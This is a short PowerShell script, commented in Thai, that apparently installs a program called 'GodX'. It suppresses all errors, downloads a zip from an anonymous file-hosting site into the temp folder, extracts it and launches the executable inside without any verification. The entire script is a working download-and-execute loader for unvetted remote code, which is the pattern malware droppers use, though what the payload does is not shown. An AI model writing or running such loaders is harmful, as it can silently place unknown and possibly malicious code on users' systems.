$ErrorActionPreference = 'SilentlyContinue'
$targetDir = "$env:TEMP\GodX_App"
$zipPath = "$targetDir\package.zip"
$url = "https://files.catbox.moe/afb9rh.zip"
$exeName = "Setting GodX.exe" # ตรวจสอบชื่อไฟล์ข้างใน .zip ให้ตรงกับชื่อนี้

# 1. เตรียมโฟลเดอร์
if (!(Test-Path $targetDir)) { New-Item -ItemType Directory -Path $targetDir -Force | Out-Null }

# 2. ดาวน์โหลด .zip
Invoke-WebRequest -Uri $url -OutFile $zipPath

# 3. แตกไฟล์
Expand-Archive -Path $zipPath -DestinationPath $targetDir -Force

# 4. รันโปรแกรม (ตรวจสอบชื่อไฟล์ให้ตรงกับที่อยู่ใน .zip)
$exePath = Join-Path $targetDir $exeName
if (Test-Path $exePath) {
    Start-Process -FilePath $exePath -WorkingDirectory $targetDir -WindowStyle Normal
} else {
    Write-Host "ไม่พบไฟล์ $exeName ในโฟลเดอร์ที่แตกออกมา" -ForegroundColor Red
}
